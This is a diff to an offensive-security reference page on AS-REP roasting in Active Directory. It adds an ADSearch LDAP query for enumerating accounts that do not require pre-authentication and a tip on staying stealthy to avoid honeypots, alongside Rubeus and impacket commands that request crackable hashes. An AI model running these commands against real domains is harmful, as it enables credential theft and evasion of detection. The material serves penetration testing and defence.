@@ -34,10 +34,13 @@ To enumerate vulnerable accounts, use following commands. It's also possible to 
 
 ```bash
 # Using ActiveDirectory PowerShell module from a domain joined computer.
-Get-ADUSer -Filter 'DoesNotRequirePreAuth -eq $true'
+Get-ADUSer -Filter 'DoesNotRequirePreAuth -eq $True'
 
 # Using PowerView from a domain joined computer.
 Get-DomainUser -PreauthNotRequired -verbose
+
+# Using ADSearch.
+ADSearch.exe --search "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname
 ```
 
 If domain contains accounts vulnerable to AS-REP roasting, request the AS-REP for concerned domain users on a targeted domain controller with [Rubeus](https://github.com/GhostPack/Rubeus) or [impacket-GetNPUsers](https://github.com/fortra/impacket).
@@ -52,6 +55,9 @@ impacket-GetNPUsers -dc-ip $dc_ip -request -outputfile hashes.asreproast $domain
 # From a Windows computer not joined to the domain.
 .\Rubeus.exe asreproast /creduser:$domain\$username /credpassword:$password /domain:$domain /dc:$dc_ip /outfile:hashes.asreproast /nowrap
 ```
+
+{: .warning }
+> If you want to be more stealthy and avoid honey pots, request one user at the time. For instance, with `Rubeus`, add `/user:$target` option.
 
 Then, crack the AS-REP hash. You can use [hashcat](https://github.com/hashcat/hashcat) to do that.
 
